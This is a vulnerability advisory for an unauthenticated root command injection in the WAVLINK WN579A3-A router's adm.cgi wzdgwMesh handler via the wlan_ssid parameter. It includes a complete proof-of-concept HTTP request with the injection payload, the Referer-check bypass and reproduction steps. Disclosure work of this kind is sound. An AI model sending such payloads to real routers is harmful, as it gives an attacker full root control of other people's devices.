# WAVLINK WN579A3-A firmware build 2026-03-10 (94f93d4): Unauthenticated command injection vulnerability in adm.cgi wzdgwMesh via wlan_ssid leading to root RCE

## TARGET

- Device: WAVLINK WN579A3-A Router (MT7628)  
- Firmware version : WINSTAR_WN579A3-A-2026-03-10-94f93d4 

## BUG TYPE

 Command Execution Vulnerability


## Affected Environment

- SoC: MediaTek MT7628 (MIPS 24Kc, OpenWrt ramips)
- OS: OpenWrt Chaos Calmer 15.05.1, kernel 3.10.108
- Web: LuCI git-22.308.13369-94f93d4 / lighttpd 1.4.45
- CGI: `/cgi-bin/adm.cgi` (chrooted in the rootfs)

## **Abstract**



The WAVLINK WL-WN579A3-A router contains a command injection vulnerability in the `set_wzdgwMesh` function within the `/cgi-bin/adm.cgi` CGI program. This vulnerability specifically occurs during the processing of the `wlan_ssid` parameter. Due to insufficient input validation and inadequate filtering of user-controllable parameters, attackers can inject system commands into the `wlan_ssid` parameter through specially crafted malicious requests. By exploiting this vulnerability, unauthorized attackers can execute arbitrary system commands as root during the initial setup wizard state (`UserInit=0`), thereby gaining complete control over affected router devices.

### Vulnerability Point

<img width="567" height="194" alt="image-20260804201524488" src="https://github.com/user-attachments/assets/f0b1c9f1-f498-4f12-9dd8-130118abc3bb" />



When `page=wzdgwMesh`, execution enters `sub_404904`.

<img width="688" height="214" alt="image-20260804190655990" src="https://github.com/user-attachments/assets/b2703307-3170-44a0-85f7-634167ec004d" />



The function below receives the parameters `Wan0T`, `wl_Method`, `wlan_ssid`, etc.

<img width="723" height="348" alt="image-20260804195428853" src="https://github.com/user-attachments/assets/08ee0b63-44f7-45f5-bf27-e09fef4a229b" />


When the input passes through the blacklist check `sub_40A93C`:



<img width="777" height="238" alt="image-20260804200159032" src="https://github.com/user-attachments/assets/8fe22c9f-bbe0-4cde-8eb6-bdfb8efd1728" />

It only checks for `|` and backticks (`` ` ``).

<img width="516" height="315" alt="image-20260804200322454" src="https://github.com/user-attachments/assets/03eb7b02-5e72-4033-ac3a-2f196a8bf0ab" />

Execution then continues into the vulnerable sink `system()`:

<img width="726" height="404" alt="image-20260804200655119" src="https://github.com/user-attachments/assets/92371d5a-b5a5-4469-84b1-10e56342f5b6" />



Since the blacklist does not filter `;`, `"`, `>`, `#`, etc., an attacker can craft a command injection payload and achieve root RCE.

This requires the device to be in the initial setup wizard state: when `option UserInit` in `/etc/config/winstar` is `0`, unauthenticated RCE is possible.

### PoC

```
POST /cgi-bin/adm.cgi HTTP/1.1

Host: 192.168.10.2

Content-Length: 224

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.10.2

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://ap.setup/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



page=wzdgwMesh&Wan0T=1&wl_Method=OPEN&wlan_ssid=Z%22%3Becho%20getshell%20%3E%20%2Fcmd.txt%3B%23&EncrypType=NONE&web_pskValue=x
```

### Impact

In the initial setup wizard state (fresh out-of-box or after factory reset, `UserInit=0`, `Popup=1`), an attacker without any authentication or cookie can execute arbitrary commands as **root** on the router.

### Reproduction

**Prerequisites**

1. The device is in the initial setup wizard state: `option UserInit '0'` and `option Popup 1` in `/etc/config/winstar` (true for a fresh/out-of-box device or after factory reset; for an already-initialized device, reset the flag on the device side first — see step 1)
2. The device WLAN band is the factory default `WiFiBand 'D'` (a UCI configuration, not a request parameter — the attacker neither needs to nor can specify it)

**Reproduction Steps**

1. (Required on first reproduction to reset the wizard flag) Run on the device:
```bash
sed -i "s/option UserInit '.*'/option UserInit '0'/" /etc/config/winstar
cat /etc/config/winstar | grep User
```
**The status before and after the reset is shown in the figure below:**

<img width="1145" height="154" alt="image-20260804201843712" src="https://github.com/user-attachments/assets/be981fb5-40cd-4217-89e6-4b77af5add0e" />


<img width="1237" height="574" alt="image-20260804201723545" src="https://github.com/user-attachments/assets/5ae60491-d74c-4c77-a3ff-722bc3d67d4e" />


**2. Send exploit request without cookies** (as described in the previous section, with `wlan_ssid=Z%22%3Becho%20getshell%20%3E%20%2Fcmd.txt%3B%23`, and the Referer header containing `ap.setup` to pass the validation check).

**3. Verification:** The file `/cmd.txt` appears in the device's root directory, containing the string `getshell`, confirming that the command was executed with root privileges.


<img width="1530" height="655" alt="image-20260804201919954" src="https://github.com/user-attachments/assets/2e14211a-c66f-4dd6-8743-787be9eb4ac8" />
